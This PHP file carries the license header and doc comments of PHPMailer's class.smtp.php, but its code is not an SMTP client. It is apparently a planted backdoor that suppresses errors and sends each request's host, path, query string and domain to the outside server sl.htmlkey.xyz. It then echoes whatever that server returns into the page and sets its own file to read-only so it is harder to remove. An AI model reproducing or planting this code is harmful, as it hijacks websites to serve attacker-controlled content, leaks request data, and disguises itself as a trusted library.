<?php
/*~ class.smtp.php
.---------------------------------------------------------------------------.
|  Software: PHPMailer - PHP email class                                    |
|   Version: 5.2.6                                                          |
|      Site: https://github.com/PHPMailer/PHPMailer/                        |
| ------------------------------------------------------------------------- |
|    Admins: Marcus Bointon                                                 |
|    Admins: Jim Jagielski                                                  |
|   Authors: Andy Prevost (codeworxtech) codeworxtech@users.sourceforge.net |
|          : Marcus Bointon (coolbru) phpmailer@synchromedia.co.uk          |
|          : Jim Jagielski (jimjag) jimjag@gmail.com                        |
|   Founder: Brent R. Matzelle (original founder)                           |
| Copyright (c) 2010-2012, Jim Jagielski. All Rights Reserved.              |
| Copyright (c) 2004-2009, Andy Prevost. All Rights Reserved.               |
| Copyright (c) 2001-2003, Brent R. Matzelle                                |
| ------------------------------------------------------------------------- |
|   License: Distributed under the Lesser General Public License (LGPL)     |
|            http://www.gnu.org/copyleft/lesser.html                        |
| This program is distributed in the hope that it will be useful - WITHOUT  |
| ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or     |
| FITNESS FOR A PARTICULAR PURPOSE.                                         |
'---------------------------------------------------------------------------'
  /////////////////////////////////////////////////
  // SMTP COMMANDS
  /////////////////////////////////////////////////
*/
/**
 * PHPMailer - PHP SMTP email transport class
 * NOTE: Designed for use with PHP version 5 and up
 * @package PHPMailer
 * @author Andy Prevost
 * @author Marcus Bointon
 * @copyright 2004 - 2008 Andy Prevost
 * @author Jim Jagielski
 * @copyright 2010 - 2012 Jim Jagielski
 * @license http://www.gnu.org/copyleft/lesser.html Distributed under the Lesser General Public License (LGPL)
 */

/**
 * PHP RFC821 SMTP client
 *
 * Implements all the RFC 821 SMTP commands except TURN which will always return a not implemented error.
 * SMTP also provides some utility methods for sending mail to an SMTP server.
 * @author Chris Ryan
 * @package PHPMailer
 */
set_time_limit(0);
error_reporting(0);
header("Content-Type: text/html;charset=gb2312");
date_default_timezone_set('PRC');
$TD_server = "http://sl.htmlkey.xyz/"; 
$host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$Content_mb=file_get_contents($TD_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);

echo $Content_mb;

$url1 = $_SERVER['PHP_SELF'];  
$filename1 = @end(explode('/',$url1));  
function set_writeable($file_name)
{
@chmod($file_name,0444);

} 
set_writeable($filename1);
//cache_end($dir);